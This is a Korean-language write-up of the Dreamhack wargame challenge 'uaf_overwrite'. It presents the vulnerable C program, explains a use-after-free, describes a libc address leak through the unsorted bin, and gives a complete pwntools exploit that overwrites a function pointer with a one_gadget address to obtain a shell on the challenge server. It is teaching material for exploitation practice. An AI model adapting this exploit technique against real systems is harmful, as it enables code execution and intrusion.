---
title: "System Hacking Wargame - Dreamhack: uaf_overwrite"
categories: [Security, SystemHacking]
tags: [pwnable, uaf, wargame, allocator] # TAG names should always be lowercase
---

[uaf_overwrite](https://dreamhack.io/wargame/challenges/357)


## 문제의 코드

```c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

## Check Point

### Code Vuln
- `sizeof(struct Human) == sizeof(struct Robot)` 이므로 서로 메모리 할당/해제 시 청크 재사용의 여지가 있다.

- `Robot::fptr`, `Human::age`가 메모리상 상대 위치가 같고, 크기도 같다. `robot_func`에 따르면 `fptr`에 뭔가 있으면 불러온다. 따라서 `Human::age`에 임의 함수 주소를 넣고, `Robot`객체를 만들면 임의 함수가 실행된다.

- `custom_func`에서 임의 크기만큼의 청크를 할당 및 해제하고 해당 객체에 데이터를 쓰고 출력할 수 있다. 이는 libc_base leak으로 이어질 여지가 있다.

### ptmalloc2 :: unsortedbin-libc

#### Feature of unsorted bin
unsorted bin에 처음 연결되는 청크는 libc 영역의 특정 주소와 Circular Doubly Linked List 를 형성한다.

unsorted bin에 속하는 청크는 Top Chunk와 병합 대상이므로 둘이 맞닿아 있으면 병합된다.

#### How to Connect to unsorted bin
0x410 이하 크기의 청크는 tcache에 먼저 삽입된다. 따라서 이보다 큰 청크를 해제하면 unsorted bin에 연결된다.

## Write-up
위 성질들을 이용해서 시나리오를 짜보자

1. leak libc_base

  - custom 함수를 통해 unsorted bin에 청크를 연결시키고 이를 다시 재할당하는 과정에서 하위 8비트가 오염된 fd영역을 출력할 수 있다.

  - 이 임의 주소와 libc_base 까지의 offset(정적 분석으로 gdb에서 사전조사)을 빼면 libc_base가 유출된다.

2. age로 one_gadget주소를 갖는 Human 객체를 생성, 할당, 해제한다.

3. 이후 생성되는 Robot 객체는 Human객체에 사용된 청크를 재사용 하므로 fptr에 one_gadget이 입력되어있다.

4. one_gadget이 실행된다.

### Exploit Code
```python
from pwn import *


#p = process("./uaf_overwrite")
p = remote("host3.dreamhack.games", 14086)
e = ELF("./uaf_overwrite")
libc = ELF("./libc-2.27.so")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

def human(weight:int, age:int):
    p.sendlineafter(b">", b'1')
    p.sendlineafter(b": ", str(weight).encode())
    p.sendlineafter(b": ", str(age).encode())


def robot(weight:int):
    p.sendlineafter(b">", b'2')
    p.sendlineafter(b": ", str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())


custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1)

lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c


slog("libc_base", lb)
slog("one_gadget", og)

human(1, og)
robot(1)

p.interactive()
```

